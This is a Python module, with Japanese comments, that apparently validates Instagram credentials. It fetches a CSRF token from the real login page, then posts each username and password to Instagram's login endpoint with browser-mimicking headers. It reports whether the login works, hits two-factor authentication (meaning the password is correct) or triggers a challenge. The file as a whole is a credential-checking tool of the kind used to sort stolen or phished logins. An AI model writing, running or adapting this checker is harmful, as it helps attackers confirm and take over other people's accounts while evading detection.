import time

import requests

LOGIN_PAGE = "https://www.instagram.com/accounts/login/"
LOGIN_AJAX = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
APP_ID = "936619743392459"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")


def verify(username, password):
    """
    本物のInstagramにログインできるか試す。
    戻り値: (status, detail)
      ok        ログイン成功
      2fa       2段階認証あり（パスワード自体は正しい）
      challenge 本人確認を求められた
      ng        メアパスが違う
      unknown   通信エラーで判定不能
    """
    if not username or not password:
        return "ng", "empty"

    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept-Language": "ja,en;q=0.9"})

    try:
        s.get(LOGIN_PAGE, timeout=10)
        token = s.cookies.get("csrftoken", "")
        if not token:
            return "unknown", "no csrftoken"

        data = {
            "username": username,
            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
            "queryParams": "{}",
            "optIntoOneTap": "false",
        }
        headers = {
            "X-CSRFToken": token,
            "X-IG-App-ID": APP_ID,
            "X-Requested-With": "XMLHttpRequest",
            "X-Instagram-AJAX": "1",
            "Referer": LOGIN_PAGE,
            "Origin": "https://www.instagram.com",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        j = s.post(LOGIN_AJAX, data=data, headers=headers, timeout=15).json()
    except Exception as e:
        print(f"[ig_login] error: {e}")
        return "unknown", str(e)[:120]

    msg = str(j.get("message", ""))[:120]

    if j.get("authenticated"):
        return "ok", msg or "authenticated"
    if j.get("two_factor_required"):
        return "2fa", msg or "two_factor_required"
    if "checkpoint" in msg or "challenge" in msg:
        return "challenge", msg
    return "ng", msg or "wrong password"
